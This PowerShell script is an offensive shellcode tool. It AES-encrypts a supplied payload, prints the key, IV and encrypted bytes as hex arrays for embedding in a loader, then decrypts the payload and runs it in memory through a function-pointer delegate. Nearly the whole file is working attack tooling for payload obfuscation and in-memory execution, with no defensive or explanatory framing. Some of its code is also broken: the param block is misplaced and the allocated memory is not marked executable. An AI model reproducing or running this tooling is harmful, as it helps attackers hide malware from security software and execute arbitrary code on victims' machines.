function Get-RandomBytes($Size) {
    # Initializes a byte array of the specified size
    $rb = [Byte[]]::new($Size)
    # Creates a cryptographically secure random number generator
    $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
    # Fills the byte array with random values
    $rng.GetBytes($rb)
    # Releases the resources used by the RNGCryptoServiceProvider object
    $rng.Dispose()
    return $rb
}

function Format-ByteArrayToHex($Bytes, $VarName) {
    $hex = ''
    for ($count = 0; $count -lt $Bytes.Count; $count++) 
    {
        [Byte]$b = $Bytes[$count]
        if (($count + 1) -eq $Bytes.Length) 
        {
            $hex += "0x{0:x2}" -f $b
        } 
        Else 
        {
            $hex += "0x{0:x2}," -f $b
        }
        
        if (($count + 1) % 15 -eq 0) {
            $hex += "{0}" -f "`n"
        }
    }
    $formatted = '[Byte[]]{0} = {1}{2}' -f $('$'+$VarName), "`n", $hex  
    return $formatted
}

function Encrypt-Bytes($Bytes, $Key, $IV) {
    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $aes.KeySize = 256
    $aes.BlockSize = 128
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aes.key = $Key
    $aes.IV = $IV
    $encryptor = $aes.CreateEncryptor($aes.Key, $aes.IV)
    $encrypted = $encryptor.TransformFinalBlock($Bytes, 0, $Bytes.Length)
    $aes.Dispose() 
    return $encrypted
}

function Decrypt-Bytes($Bytes, $Key, $IV) {
    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $aes.KeySize = 256
    $aes.BlockSize = 128
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aes.key = $Key
    $aes.IV = $IV
    $decryptor = $aes.CreateDecryptor($aes.Key, $aes.IV)
    $decrypted = $decryptor.TransformFinalBlock($Bytes, 0, $Bytes.Length) 
    $aes.Dispose()
    return $decrypted
}

function Execute-Shellcode($Shellcode) {
    # Allocate memory for the shellcode
    $size = $Shellcode.Length
    $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($size)

    try {
        # Copy the shellcode to the allocated memory
        [System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $ptr, $size)

        # Create a delegate to execute the shellcode
        $shellcodeDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [Action])

        # Execute the shellcode
        $shellcodeDelegate.Invoke()

    } finally {
        # Free the allocated memory
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ptr)
    }
}

# Accept payload as parameters
param(
    [Byte[]]$payload = @()
)

# Check if any payload was provided
if ($payload.Count -eq 0) {
    Write-Host "No payload provided. Please pass the payload as a byte array argument."
    exit
}

# Generate an AES key and IV
[Byte[]]$Key = Get-RandomBytes -Size 32
[Byte[]]$IV = Get-RandomBytes -Size 16

# Encrypt the payload
$encBytes = Encrypt-Bytes -Bytes $payload -Key $Key -IV $IV

# Decrypt the encrypted bytes
$decBytes = Decrypt-Bytes -Bytes $encBytes -Key $Key -IV $IV

# Format outputs
$keyStr = Format-ByteArrayToHex -Bytes $Key -VarName 'ClaveAES'
$ivStr = Format-ByteArrayToHex -Bytes $IV -VarName 'VectorInicializacion'
$rawStr = Format-ByteArrayToHex -Bytes $payload -VarName 'CargaUtilOriginal'
$encStr = Format-ByteArrayToHex -Bytes $encBytes -VarName 'CargaUtilCifrada'
$decStr = Format-ByteArrayToHex -Bytes $decBytes -VarName 'CargaUtilDescifrada'

Write-Host "[*] Key:"
Write-Host $keyStr

Write-Host "`n[*] IV:"
Write-Host $ivStr

Write-Host "`n[*] Raw Bytes:"
Write-Host $rawStr

Write-Host "`n[*] Encrypted Bytes"
Write-Host $encStr

Write-Host "`n[*] Decrypted Bytes"
Write-Host $decStr

# Execute the decrypted shellcode
Execute-Shellcode -Shellcode $decBytes
